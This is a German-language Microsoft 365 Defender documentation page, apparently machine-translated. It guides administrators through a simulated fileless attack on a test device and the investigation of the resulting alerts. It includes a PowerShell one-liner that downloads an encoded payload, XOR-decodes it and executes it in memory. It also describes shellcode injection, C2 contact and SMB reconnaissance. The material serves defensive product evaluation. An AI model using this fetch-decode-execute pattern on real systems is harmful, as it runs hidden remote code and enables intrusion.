---
title: Ausführen ihrer Microsoft 365 Defender-Angriffssimulationen
description: Führen Sie Angriffssimulationen für Ihr Microsoft 365 Defender-Pilotprojekt aus, um zu sehen, wie es sich entwickelt und schnell behoben wird.
keywords: Microsoft 365 Defender Pilotangriffssimulation, Microsoft 365 Defender Pilotangriffssimulation ausführen, Angriff in Microsoft 365 Defender simulieren, Microsoft 365 Defender Pilotprojekt, Cybersicherheit, erweiterte dauerhafte Bedrohung, Unternehmenssicherheit, Geräte, Geräte, Identität, Benutzer, Daten, Anwendungen, Vorfälle, automatisierte Untersuchung und Behebung, erweiterte Suche
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 18dc8158ef3c806e5dac5a01778adebc6eecc1ce
ms.sourcegitcommit: 9856f86532bdcf0befbcdbdb7c6dc6bf89fe63b5
ms.translationtype: MT
ms.contentlocale: de-DE
ms.lasthandoff: 07/16/2021
ms.locfileid: "53458429"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a><span data-ttu-id="d8402-104">Ausführen ihrer Microsoft 365 Defender-Angriffssimulationen</span><span class="sxs-lookup"><span data-stu-id="d8402-104">Run your Microsoft 365 Defender attack simulations</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|<span data-ttu-id="d8402-105">[![Planung](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)</span><span class="sxs-lookup"><span data-stu-id="d8402-105">[![Planning](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)</span></span><br/>[<span data-ttu-id="d8402-106">Planung</span><span class="sxs-lookup"><span data-stu-id="d8402-106">Planning</span></span>](m365d-pilot-plan.md)|<span data-ttu-id="d8402-107">[![Vorbereiten](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)</span><span class="sxs-lookup"><span data-stu-id="d8402-107">[![Prepare](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)</span></span><br/>[<span data-ttu-id="d8402-108">Vorbereitung</span><span class="sxs-lookup"><span data-stu-id="d8402-108">Preparation</span></span>](prepare-m365d-eval.md)|![Angriff simulieren](../../media/phase-diagrams/3-simluate.png)<br/><span data-ttu-id="d8402-110">Angriff simulieren</span><span class="sxs-lookup"><span data-stu-id="d8402-110">Simulate attack</span></span>|<span data-ttu-id="d8402-111">[![Schließen und zusammenfassen](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)</span><span class="sxs-lookup"><span data-stu-id="d8402-111">[![Close and summarize](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)</span></span><br/>[<span data-ttu-id="d8402-112">Schließen und zusammenfassen</span><span class="sxs-lookup"><span data-stu-id="d8402-112">Close and summarize</span></span>](m365d-pilot-close.md)|
|--|--|--|--|
|||<span data-ttu-id="d8402-113">*Sie sind hier!*</span><span class="sxs-lookup"><span data-stu-id="d8402-113">*You are here!*</span></span>||

<span data-ttu-id="d8402-114">Sie befinden sich derzeit in der Angriffssimulationsphase.</span><span class="sxs-lookup"><span data-stu-id="d8402-114">You're currently in the attack simulation phase.</span></span>

<span data-ttu-id="d8402-115">Nach der Vorbereitung Ihrer Pilotumgebung ist es an der Zeit, die Microsoft 365 Defender Vorfallverwaltung und automatisierte Untersuchungs- und Behebungsfunktionen zu testen.</span><span class="sxs-lookup"><span data-stu-id="d8402-115">After preparing your pilot environment, it's time to test the Microsoft 365 Defender incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="d8402-116">Wir helfen Ihnen bei der Simulation eines komplexen Angriffs, der erweiterte Techniken nutzt, um sich vor der Erkennung auszublenden.</span><span class="sxs-lookup"><span data-stu-id="d8402-116">We'll help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="d8402-117">Der Angriff zählt geöffnete Server Message Block (SMB)-Sitzungen auf Domänencontrollern auf und ruft die letzten IP-Adressen der Geräte der Benutzer ab.</span><span class="sxs-lookup"><span data-stu-id="d8402-117">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices.</span></span> <span data-ttu-id="d8402-118">Diese Kategorie von Angriffen umfasst in der Regel keine Dateien, die auf dem Gerät des Opfers abgelegt wurden– sie erfolgen ausschließlich im Arbeitsspeicher.</span><span class="sxs-lookup"><span data-stu-id="d8402-118">This category of attacks usually doesn't include files dropped on the victim's device—they occur solely in memory.</span></span> <span data-ttu-id="d8402-119">Sie "leben vom Land", indem sie vorhandene System- und Verwaltungstools verwenden und ihren Code in Systemprozesse einfügen, um ihre Ausführung auszublenden. Ein solches Verhalten ermöglicht es ihnen, die Erkennung zu umgehen und auf dem Gerät zu speichern.</span><span class="sxs-lookup"><span data-stu-id="d8402-119">They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution, Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="d8402-120">In dieser Simulation beginnt unser Beispielszenario mit einem PowerShell-Skript.</span><span class="sxs-lookup"><span data-stu-id="d8402-120">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="d8402-121">Ein Benutzer wird möglicherweise dazu betrogen, ein Skript auszuführen.</span><span class="sxs-lookup"><span data-stu-id="d8402-121">A user might be tricked into running a script.</span></span> <span data-ttu-id="d8402-122">Oder das Skript kann von einer Remoteverbindung mit einem anderen Computer von einem zuvor infizierten Gerät aus ausgeführt werden – der Angreifer versucht, sich seitlich im Netzwerk zu bewegen.</span><span class="sxs-lookup"><span data-stu-id="d8402-122">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="d8402-123">Die Erkennung dieser Skripts kann schwierig sein, da Administratoren Skripts häufig auch remote ausführen, um verschiedene Administrative Aktivitäten auszuführen.</span><span class="sxs-lookup"><span data-stu-id="d8402-123">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Dateiloser PowerShell-Angriff mit Prozessinjektion und SMB-Reconnaisance-Angriffsdiagramm](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="d8402-125">Während der Simulation fügt der Angriff Shellcode in einen scheinbar unerschwungenen Prozess ein.</span><span class="sxs-lookup"><span data-stu-id="d8402-125">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="d8402-126">Das Szenario erfordert die Verwendung von notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="d8402-126">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="d8402-127">Wir haben diesen Prozess für die Simulation ausgewählt, aber Angreifer würden wahrscheinlich eher auf einen lange ausgeführten Systemprozess abzielen, z. B. svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="d8402-127">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="d8402-128">Die Shellcode kontaktiert dann den Befehls- und Steuerungsserver (C2) des Angreifers, um Anweisungen zum Weiteren zu erhalten.</span><span class="sxs-lookup"><span data-stu-id="d8402-128">The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="d8402-129">Das Skript versucht, Abstimmungsabfragen für den Domänencontroller (DC) auszuführen.</span><span class="sxs-lookup"><span data-stu-id="d8402-129">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="d8402-130">Mit der Reconnaissance kann ein Angreifer Informationen über die letzten Benutzeranmeldeinformationen abrufen.</span><span class="sxs-lookup"><span data-stu-id="d8402-130">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="d8402-131">Sobald Angreifer über diese Informationen verfügen, können sie sich seitlich im Netzwerk bewegen, um zu einem bestimmten vertraulichen Konto zu gelangen.</span><span class="sxs-lookup"><span data-stu-id="d8402-131">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

> [!IMPORTANT]
> <span data-ttu-id="d8402-132">Um optimale Ergebnisse zu erzielen, befolgen Sie die Anweisungen zur Angriffssimulation so genau wie möglich.</span><span class="sxs-lookup"><span data-stu-id="d8402-132">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>

## <a name="simulation-environment-requirements"></a><span data-ttu-id="d8402-133">Anforderungen an die Simulationsumgebung</span><span class="sxs-lookup"><span data-stu-id="d8402-133">Simulation environment requirements</span></span>

<span data-ttu-id="d8402-134">Da Sie Ihre Pilotumgebung bereits während der Vorbereitungsphase konfiguriert haben, stellen Sie sicher, dass Sie über zwei Geräte für dieses Szenario verfügen: ein Testgerät und einen Domänencontroller.</span><span class="sxs-lookup"><span data-stu-id="d8402-134">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1. <span data-ttu-id="d8402-135">Stellen Sie sicher, dass Ihr Mandant [Microsoft 365 Defender aktiviert](m365d-enable.md#confirm-that-the-service-is-on)hat.</span><span class="sxs-lookup"><span data-stu-id="d8402-135">Verify your tenant has [enabled Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span></span>

2. <span data-ttu-id="d8402-136">Überprüfen Sie die Konfiguration des Test-Domänencontrollers:</span><span class="sxs-lookup"><span data-stu-id="d8402-136">Verify your test domain controller configuration:</span></span>

   - <span data-ttu-id="d8402-137">Das Gerät wird mit Windows Server 2008 R2 oder einer neueren Version ausgeführt.</span><span class="sxs-lookup"><span data-stu-id="d8402-137">Device runs with Windows Server 2008 R2 or a later version.</span></span>
   - <span data-ttu-id="d8402-138">Der Testdomänencontroller für [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) und aktivieren die [Remoteverwaltung.](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)</span><span class="sxs-lookup"><span data-stu-id="d8402-138">The test domain controller to [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) and enable [remote management](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>
   - <span data-ttu-id="d8402-139">Stellen Sie sicher, dass [Microsoft Defender for Identity und Microsoft Cloud App Security Integration](/cloud-app-security/mdi-integration) aktiviert wurden.</span><span class="sxs-lookup"><span data-stu-id="d8402-139">Verify that [Microsoft Defender for Identity and Microsoft Cloud App Security integration](/cloud-app-security/mdi-integration) have been enabled.</span></span>
   - <span data-ttu-id="d8402-140">Ein Testbenutzer wird in Ihrer Domäne erstellt – es sind keine Administratorberechtigungen erforderlich.</span><span class="sxs-lookup"><span data-stu-id="d8402-140">A test user is created on your domain – no admin permissions needed.</span></span>

3. <span data-ttu-id="d8402-141">Überprüfen sie die Konfiguration des Testgeräts:</span><span class="sxs-lookup"><span data-stu-id="d8402-141">Verify test device configuration:</span></span>

   1. <span data-ttu-id="d8402-142">Das Gerät wird mit Windows 10 Version 1903 oder einer neueren Version ausgeführt.</span><span class="sxs-lookup"><span data-stu-id="d8402-142">Device runs with Windows 10 version 1903 or a later version.</span></span>

   1. <span data-ttu-id="d8402-143">Das Testgerät ist der Testdomäne beigetreten.</span><span class="sxs-lookup"><span data-stu-id="d8402-143">Test device is joined to the test domain.</span></span>

   1. <span data-ttu-id="d8402-144">[Aktivieren Sie Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span><span class="sxs-lookup"><span data-stu-id="d8402-144">[Turn on Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="d8402-145">Wenn Sie Probleme beim Aktivieren von Windows Defender Antivirus haben, lesen Sie dieses [Problembehandlungsthema.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)</span><span class="sxs-lookup"><span data-stu-id="d8402-145">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>

   1. <span data-ttu-id="d8402-146">Stellen Sie sicher, dass das Testgerät [in Microsoft Defender für Endpunkt integriert ist.](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)</span><span class="sxs-lookup"><span data-stu-id="d8402-146">Verify that the test device is [onboarded to Microsoft Defender for Endpoint)](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="d8402-147">Wenn Sie einen vorhandenen Mandanten verwenden und Gerätegruppen implementieren, erstellen Sie eine dedizierte Gerätegruppe für das Testgerät, und übertragen Sie sie auf die oberste Ebene der Konfigurations-UX.</span><span class="sxs-lookup"><span data-stu-id="d8402-147">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>

## <a name="run-the-attack-scenario-simulation"></a><span data-ttu-id="d8402-148">Ausführen der Angriffsszenariosimulation</span><span class="sxs-lookup"><span data-stu-id="d8402-148">Run the attack scenario simulation</span></span>

<span data-ttu-id="d8402-149">So führen Sie die Simulation des Angriffsszenarios aus:</span><span class="sxs-lookup"><span data-stu-id="d8402-149">To run the attack scenario simulation:</span></span>

1. <span data-ttu-id="d8402-150">Melden Sie sich mit dem Testbenutzerkonto beim Testgerät an.</span><span class="sxs-lookup"><span data-stu-id="d8402-150">Log in to the test device with the test user account.</span></span>

2. <span data-ttu-id="d8402-151">Öffnen Sie ein Windows PowerShell Fenster auf dem Testgerät.</span><span class="sxs-lookup"><span data-stu-id="d8402-151">Open a Windows PowerShell window on the test device.</span></span>

3. <span data-ttu-id="d8402-152">Kopieren Sie das folgende Simulationsskript:</span><span class="sxs-lookup"><span data-stu-id="d8402-152">Copy the following simulation script:</span></span>

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > <span data-ttu-id="d8402-153">Wenn Sie dieses Dokument in einem Webbrowser öffnen, können Probleme beim Kopieren des Vollständigtexts auftreten, ohne bestimmte Zeichen zu verlieren oder zusätzliche Zeilenumbrüche zu verursachen.</span><span class="sxs-lookup"><span data-stu-id="d8402-153">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="d8402-154">Laden Sie dieses Dokument herunter, und öffnen Sie es in Adobe Reader.</span><span class="sxs-lookup"><span data-stu-id="d8402-154">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="d8402-155">Fügen Sie an der Eingabeaufforderung das kopierte Skript ein, und führen Sie es aus.</span><span class="sxs-lookup"><span data-stu-id="d8402-155">At the prompt, paste and run the copied script.</span></span>

> [!NOTE]
> <span data-ttu-id="d8402-156">Wenn Sie PowerShell mithilfe des Remotedesktopprotokolls (RDP) ausführen, verwenden Sie den Befehl "Text der Zwischenablage eingeben" im RDP-Client, da die **STRG-V-Hotkey-** oder Right-Click-Paste-Methode möglicherweise nicht funktioniert.</span><span class="sxs-lookup"><span data-stu-id="d8402-156">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span> <span data-ttu-id="d8402-157">Aktuelle Versionen von PowerShell akzeptieren diese Methode manchmal auch nicht. Möglicherweise müssen Sie sie zuerst in Editor im Arbeitsspeicher kopieren, auf dem virtuellen Computer kopieren und dann in PowerShell einfügen.</span><span class="sxs-lookup"><span data-stu-id="d8402-157">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="d8402-158">Einige Sekunden später wird <i>notepad.exe</i> geöffnet.</span><span class="sxs-lookup"><span data-stu-id="d8402-158">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="d8402-159">Ein simulierter Angriffscode wird in notepad.exe eingefügt.</span><span class="sxs-lookup"><span data-stu-id="d8402-159">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="d8402-160">Lassen Sie die automatisch generierte Editor Instanz geöffnet, um das vollständige Szenario zu erleben.</span><span class="sxs-lookup"><span data-stu-id="d8402-160">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="d8402-161">Der simulierte Angriffscode versucht, mit einer externen IP-Adresse zu kommunizieren (den C2-Server zu simulieren) und dann über SMB eine Reconnaissance für den Domänencontroller zu versuchen.</span><span class="sxs-lookup"><span data-stu-id="d8402-161">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="d8402-162">Nach Abschluss dieses Skripts wird in der PowerShell-Konsole eine Meldung angezeigt.</span><span class="sxs-lookup"><span data-stu-id="d8402-162">You'll see a message displayed on the PowerShell console when this script completes.</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

<span data-ttu-id="d8402-163">Um das Feature "Automatisierter Vorfall und Reaktion" in Aktion zu sehen, lassen Sie den notepad.exe Prozess geöffnet.</span><span class="sxs-lookup"><span data-stu-id="d8402-163">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="d8402-164">Sie sehen, dass automatisierte Vorfälle und Reaktionen den Editor-Prozess beenden.</span><span class="sxs-lookup"><span data-stu-id="d8402-164">You'll see Automated Incident and Response stop the Notepad process.</span></span>

## <a name="investigate-an-incident"></a><span data-ttu-id="d8402-165">Untersuchung eines Vorfalls</span><span class="sxs-lookup"><span data-stu-id="d8402-165">Investigate an incident</span></span>

> [!NOTE]
> <span data-ttu-id="d8402-166">Bevor wir Sie durch diese Simulation führen, sehen Sie sich das folgende Video an, um zu sehen, wie die Vorfallverwaltung Ihnen hilft, die zugehörigen Warnungen im Rahmen des Untersuchungsprozesses zusammenzuarbeiten, wo Sie sie im Portal finden können und wie sie Ihnen bei Ihren Sicherheitsvorgängen helfen können:</span><span class="sxs-lookup"><span data-stu-id="d8402-166">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="d8402-167">Wenn Sie zur SOC-Analystenansicht wechseln, können Sie jetzt mit der Untersuchung des Angriffs im Microsoft 365 Security Center-Portal beginnen.</span><span class="sxs-lookup"><span data-stu-id="d8402-167">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span>

1. <span data-ttu-id="d8402-168">Öffnen Sie die Vorfallwarteschleife des [Microsoft 365 Security Center-Portals](https://security.microsoft.com/incidents) von jedem Gerät aus.</span><span class="sxs-lookup"><span data-stu-id="d8402-168">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2. <span data-ttu-id="d8402-169">Navigieren Sie im Menü zu **"Vorfälle".**</span><span class="sxs-lookup"><span data-stu-id="d8402-169">Navigate to **Incidents** from the menu.</span></span>

    ![Screenshot von Vorfällen wie im linken Menü des Microsoft 365 Security Centers](../../media/mtp/fig1.png)

3. <span data-ttu-id="d8402-171">Der neue Vorfall für den simulierten Angriff wird in der Vorfallwarteschlange angezeigt.</span><span class="sxs-lookup"><span data-stu-id="d8402-171">The new incident for the simulated attack will appear in the incident queue.</span></span>

    ![Screenshot der Vorfallwarteschlange](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="d8402-173">Untersuchen des Angriffs als einzelner Vorfall</span><span class="sxs-lookup"><span data-stu-id="d8402-173">Investigate the attack as a single incident</span></span>

<span data-ttu-id="d8402-174">Microsoft 365 Defender korreliert Analysen und aggregiert alle zugehörigen Warnungen und Untersuchungen aus verschiedenen Produkten in einer Vorfallentität.</span><span class="sxs-lookup"><span data-stu-id="d8402-174">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="d8402-175">Auf diese Weise zeigt Microsoft 365 Defender eine umfassendere Angriffsstory, die es dem SOC-Analysten ermöglicht, komplexe Bedrohungen zu verstehen und darauf zu reagieren.</span><span class="sxs-lookup"><span data-stu-id="d8402-175">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="d8402-176">Die während dieser Simulation generierten Warnungen sind derselben Bedrohung zugeordnet und werden daher automatisch als einzelner Vorfall aggregiert.</span><span class="sxs-lookup"><span data-stu-id="d8402-176">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="d8402-177">So zeigen Sie den Vorfall an:</span><span class="sxs-lookup"><span data-stu-id="d8402-177">To view the incident:</span></span>

1. <span data-ttu-id="d8402-178">Navigieren Sie zur **Vorfallwarteschlange.**</span><span class="sxs-lookup"><span data-stu-id="d8402-178">Navigate to the **Incidents** queue.</span></span>

   ![Screenshot von Vorfällen im Navigationsmenü](../../media/mtp/fig1.png)

2. <span data-ttu-id="d8402-180">Wählen Sie das neueste Element aus, indem Sie auf den Kreis links neben dem Vorfallnamen klicken.</span><span class="sxs-lookup"><span data-stu-id="d8402-180">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="d8402-181">In einem Seitenbereich werden zusätzliche Informationen zu dem Vorfall angezeigt, einschließlich aller zugehörigen Warnungen.</span><span class="sxs-lookup"><span data-stu-id="d8402-181">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="d8402-182">Jeder Vorfall hat einen eindeutigen Namen, der ihn basierend auf den Attributen der enthaltenen Warnungen beschreibt.</span><span class="sxs-lookup"><span data-stu-id="d8402-182">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

   ![Screenshot der Seite "Vorfälle", auf der generierte Warnungen während der Simulation aggregiert werden](../../media/mtp/fig4.png)

   <span data-ttu-id="d8402-184">Die Warnungen, die im Dashboard angezeigt werden, können basierend auf Dienstressourcen gefiltert werden: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender für Endpunkt, Microsoft 365 Defender und Microsoft Defender für Office 365.</span><span class="sxs-lookup"><span data-stu-id="d8402-184">The alerts that show in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>

3. <span data-ttu-id="d8402-185">Wählen Sie **die Seite "Vorfall öffnen"** aus, um weitere Informationen zu dem Vorfall zu erhalten.</span><span class="sxs-lookup"><span data-stu-id="d8402-185">Select **Open incident page** to get more information about the incident.</span></span>

   <span data-ttu-id="d8402-186">Auf der **Seite "Vorfall"** können Sie alle Warnungen und Informationen im Zusammenhang mit dem Vorfall anzeigen.</span><span class="sxs-lookup"><span data-stu-id="d8402-186">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="d8402-187">Die Informationen umfassen die Entitäten und Ressourcen, die an der Warnung beteiligt sind, die Erkennungsquelle der Warnungen (Microsoft Defender for Identity, EDR) und den Grund, warum sie miteinander verknüpft wurden.</span><span class="sxs-lookup"><span data-stu-id="d8402-187">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (Microsoft Defender for Identity, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="d8402-188">Die Überprüfung der Warnungsliste für Vorfälle zeigt den Verlauf des Angriffs an.</span><span class="sxs-lookup"><span data-stu-id="d8402-188">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="d8402-189">Aus dieser Ansicht können Sie die einzelnen Warnungen sehen und untersuchen.</span><span class="sxs-lookup"><span data-stu-id="d8402-189">From this view, you can see and investigate the individual alerts.</span></span>

   <span data-ttu-id="d8402-190">Sie können auch im rechten Menü auf **"Vorfall verwalten"** klicken, um den Vorfall zu kennzeichnen, sich selbst zuzuweisen und Kommentare hinzuzufügen.</span><span class="sxs-lookup"><span data-stu-id="d8402-190">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

   ![Screenshot der Stelle, an der auf "Vorfall verwalten" geklickt werden soll](../../media/mtp/fig5a.png)

   ![Screenshot der Felder im Bereich "Vorfall verwalten", in dem Sie den Vorfall markieren, sich selbst zuweisen und Kommentare hinzufügen können](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a><span data-ttu-id="d8402-193">Überprüfen generierter Warnungen</span><span class="sxs-lookup"><span data-stu-id="d8402-193">Review generated alerts</span></span>

<span data-ttu-id="d8402-194">Sehen wir uns einige der Warnungen an, die während des simulierten Angriffs generiert wurden.</span><span class="sxs-lookup"><span data-stu-id="d8402-194">Let's look at some of the alerts generated during the simulated attack.</span></span>

> [!NOTE]
> <span data-ttu-id="d8402-195">Wir werden nur einige der Warnungen durchgehen, die während des simulierten Angriffs generiert wurden.</span><span class="sxs-lookup"><span data-stu-id="d8402-195">We'll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="d8402-196">Abhängig von der Version von Windows und den Microsoft 365 Defender Produkten, die auf Ihrem Testgerät ausgeführt werden, werden möglicherweise weitere Warnungen angezeigt, die in einer etwas anderen Reihenfolge angezeigt werden.</span><span class="sxs-lookup"><span data-stu-id="d8402-196">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![Screenshot der generierten Warnungen](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a><span data-ttu-id="d8402-198">Warnung: Verdächtige Prozessinjektion beobachtet (Quelle: Microsoft Defender für Endpunkt EDR)</span><span class="sxs-lookup"><span data-stu-id="d8402-198">Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint EDR)</span></span>

<span data-ttu-id="d8402-199">Fortgeschrittene Angreifer verwenden ausgefeilte und bösartige Methoden, um im Arbeitsspeicher zu bleiben und sich vor Erkennungstools zu verbergen.</span><span class="sxs-lookup"><span data-stu-id="d8402-199">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="d8402-200">Eine gängige Technik besteht darin, innerhalb eines vertrauenswürdigen Systemprozesses zu arbeiten, anstatt eine schädliche ausführbare Datei zu verwenden, wodurch es für Erkennungstools und Sicherheitsvorgänge schwierig wird, den schädlichen Code zu erkennen.</span><span class="sxs-lookup"><span data-stu-id="d8402-200">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="d8402-201">Damit die SOC-Analysten diese erweiterten Angriffe abfangen können, bieten tiefe Speichersensoren in Microsoft Defender für Endpunkt unserem Clouddienst einen beispiellosen Einblick in eine Vielzahl von prozessübergreifenden Codeeinfügungstechniken.</span><span class="sxs-lookup"><span data-stu-id="d8402-201">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="d8402-202">Die folgende Abbildung zeigt, wie Defender für Endpunkt beim Versuch, Code in <i>notepad.exe</i>einzufügen, erkannt und benachrichtigt wurde.</span><span class="sxs-lookup"><span data-stu-id="d8402-202">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![Screenshot der Warnung zur Einschleusung von potenziell schädlichem Code](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a><span data-ttu-id="d8402-204">Warnung: Unerwartetes Verhalten, das von einem Prozess ohne Befehlszeilenargumente beobachtet wird (Quelle: Microsoft Defender für Endpunkt EDR)</span><span class="sxs-lookup"><span data-stu-id="d8402-204">Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint EDR)</span></span>

<span data-ttu-id="d8402-205">Microsoft Defender für Endpunkt-Erkennungen zielen häufig auf das am häufigsten verwendete Attribut einer Angriffstechnik ab.</span><span class="sxs-lookup"><span data-stu-id="d8402-205">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="d8402-206">Diese Methode stellt Dies sicher und erhöht die Messlatte für Angreifer, um zu neueren Taktiken zu wechseln.</span><span class="sxs-lookup"><span data-stu-id="d8402-206">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

